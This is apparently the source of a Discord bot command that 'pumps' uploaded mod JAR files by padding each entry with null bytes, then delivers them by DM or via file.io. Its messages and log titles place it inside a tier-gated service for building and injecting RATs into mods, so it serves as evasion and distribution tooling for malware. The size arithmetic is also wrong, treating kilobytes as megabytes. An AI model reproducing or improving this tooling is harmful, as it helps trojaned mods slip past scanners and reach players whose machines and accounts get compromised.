import { SlashCommandBuilder, AttachmentBuilder, EmbedBuilder } from "discord.js";
import request from "request";
import * as fs from "fs";
import AdmZip from "adm-zip";

export const cooldown = 60;
export const tier = [2, 3];
export const data = new SlashCommandBuilder()
  .setName("pump")
  .setDescription("Pump a mod's file size.")
  .addAttachmentOption((option) => option.setName("mod").setDescription("The mod to inject").setRequired(true))
  .addIntegerOption((option) =>
    option
      .setName("increase_size_kb")
      .setDescription("The size to pump the mod in KB")
      .setRequired(true)
      .setMinValue(1)
      .setMaxValue(500)
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (interaction.channel.id != client.config.building) {
    return client.sendErrorEmbed(interaction, `You can only build/use RAT commands in <#${client.config.building}>!`);
  }
  if (client.isPumping) {
    await client.sendErrorEmbed(interaction, "Another JAR is already being pumped!");
    return;
  }
  client.isPumping = true;

  const modAttachment = interaction.options.getAttachment("mod");
  const increaseSize = interaction.options.getInteger("increase_size_kb");
  const modFile = `MOD-${interaction.channel.id}.jar`;
  const modFileOut = `MOD-${interaction.channel.id}-OUT.jar`;

  if (!modAttachment.name.endsWith(".jar")) {
    client.isPumping = false;
    await client.sendErrorEmbed(interaction, "Invalid Attachments. Your file has to be a JAR file.");
    return;
  }
  const embed1 = new EmbedBuilder()
    .setColor("Green")
    .setTitle("Please wait")
    .setDescription(
      "✅ Your mod is being pumped. Please wait up to 1 minute...\n\nStatus: Downloading both JARs...\n0% [====================================]"
    );
  await interaction.reply({ ephemeral: true, embeds: [embed1] });

  try {
    await saveFile(modAttachment, modFile);
    const embed2 = new EmbedBuilder()
      .setColor("Green")
      .setTitle("Please wait")
      .setDescription(
        "✅ Your mod is being pumped. Please wait up to 1 minute...\n\nStatus: Pumping...\n50% [**==================**==================]"
      );
    await interaction.editReply({ embeds: [embed2] });

    // Pump the MOD JAR
    const increaseJarSize = (inputJarPath, outputJarPath, increaseAmountKB) => {
      return new Promise(async (resolve, reject) => {
        try {
          // Load the original JAR using adm-zip
          const originalZip = new AdmZip(inputJarPath);

          // Create a new ZIP archive for modified contents
          const outputZip = new AdmZip();

          // Get entries (files) from the original JAR
          const entries = originalZip.getEntries();

          // Loop through the entries
          entries.forEach((entry) => {
            // Read the original file's content
            const originalData = entry.getData();

            // Modify files or add dummy content to increase size
            // For example, duplicating a file to increase size
            const increaseAmountBytes = (increaseAmountKB * 1024 * 1024) / entries.length;
            const newBufferSize = originalData.length + increaseAmountBytes;
            const newBuffer = Buffer.alloc(newBufferSize);
            originalData.copy(newBuffer, 0);

            // Add the modified file to the new ZIP archive
            const newEntryName = entry.entryName;
            outputZip.addFile(newEntryName, newBuffer);
          });

          // Save the modified JAR to the output path
          outputZip.writeZip(outputJarPath);

          return resolve();
        } catch (error) {
          await client.logError(error);
          return resolve();
        }
      });
    };

    await increaseJarSize(modFile, modFileOut, increaseSize);

    const fileSize = fs.statSync(modFileOut).size / 1000;
    if (fileSize > 7500) {
      const embed3 = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Uploading...\n75% [**===========================**=========]"
        );
      await interaction.editReply({ embeds: [embed3] });

      // Upload to an alternative host
      request.post(
        {
          url: "https://file.io",
          formData: {
            files: {
              value: fs.createReadStream(modFileOut),
              options: {
                filename: modAttachment.name,
              },
            },
          },
        },
        async (err, httpResponse, body) => {
          if (err) {
            return logError(err);
          }

          const response = JSON.parse(body);
          const fileEmbed = new EmbedBuilder()
            .setColor("Green")
            .setTitle("Success")
            .setDescription("✅ File successfully uploaded. Download it from " + response.link);
          const embed4 = new EmbedBuilder()
            .setColor("Green")
            .setTitle("Please wait")
            .setDescription(
              "✅ Your mod is being pumped. Please wait up to 1 minute...\n\nStatus: Completed...\n100% [**====================================**]"
            );
          const successEmbed = new EmbedBuilder()
            .setColor(client.config.colors.commands.pump)
            .setTitle("Success! 🎉")
            .setDescription(`Your mod has been pumped successfully.`)
            .addFields({
              name: "A file has been sent to your direct messages!",
              value: "If you did not receive one, make sure you can receive DMs from members in this server.",
              inline: false,
            });
          try {
            await interaction.member.user.send({ embeds: [fileEmbed] });
          } catch (error) {}
          await interaction.editReply({ embeds: [embed4] });
          await interaction.channel.send({ content: `<@${interaction.member.id}>`, embeds: [successEmbed] });

          const logEmbed = new EmbedBuilder()
            .setColor(client.config.colors.logs.pump)
            .setTitle("RAT Injecting")
            .setDescription(
              `<@${interaction.member.id}> has pumped a MOD called **${modAttachment.name}**. The mod is: ${response.link}`
            );
          try {
            const channel = await interaction.guild.channels.fetch(client.config.logs);
            await channel.send({ embeds: [logEmbed] });
          } catch (error) {}

          // Clean up files
          fs.unlinkSync(modFile);
          fs.unlinkSync(modFileOut);
        }
      );
    } else {
      // Send the modified MOD JAR file back to Discord
      const jar = new AttachmentBuilder(modFileOut).setName(modAttachment.name);
      const embed4 = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          "✅ Your mod is being pumped. Please wait up to 1 minute...\n\nStatus: Completed...\n100% [**====================================**]"
        );
      const successEmbed = new EmbedBuilder()
        .setColor(client.config.colors.commands.pump)
        .setTitle("Success! 🎉")
        .setDescription(`Your mod has been pumped successfully.`)
        .addFields({
          name: "A file has been sent to your direct messages!",
          value: "If you did not receive one, make sure you can receive DMs from members in this server.",
          inline: false,
        });
      try {
        await interaction.member.user.send({ files: [jar] });
      } catch (error) {}
      await interaction.editReply({ embeds: [embed4] });
      await interaction.channel.send({ content: `<@${interaction.member.id}>`, embeds: [successEmbed] });

      const logEmbed = new EmbedBuilder()
        .setColor(client.config.colors.logs.pump)
        .setTitle("Mod Pumping")
        .setDescription(
          `<@${interaction.member.id}> has pumped a mod called **${modAttachment.name}**. The mod is provided as file.`
        );
      try {
        const channel = await interaction.guild.channels.fetch(client.config.logs);
        await channel.send({ files: [jar], embeds: [logEmbed] });
      } catch (error) {}

      // Clean up files
      fs.unlinkSync(modFile);
      fs.unlinkSync(modFileOut);
    }
    client.isPumping = false;
  } catch (err) {
    client.isPumping = false;
    logError(err);
    await client.sendErrorEmbed(interaction, "Something went wrong. Please contact an administrator.");
    return;
  }
}

const saveFile = async (attachment, fileName) => {
  return new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(fileName);
    const stream = request(attachment.url)
      .on("error", (err) => logError(err))
      .pipe(fileStream);
    stream.on("finish", () => {
      resolve();
    });
    stream.on("error", (err) => {
      logError(err);
      reject(err);
    });
  });
};
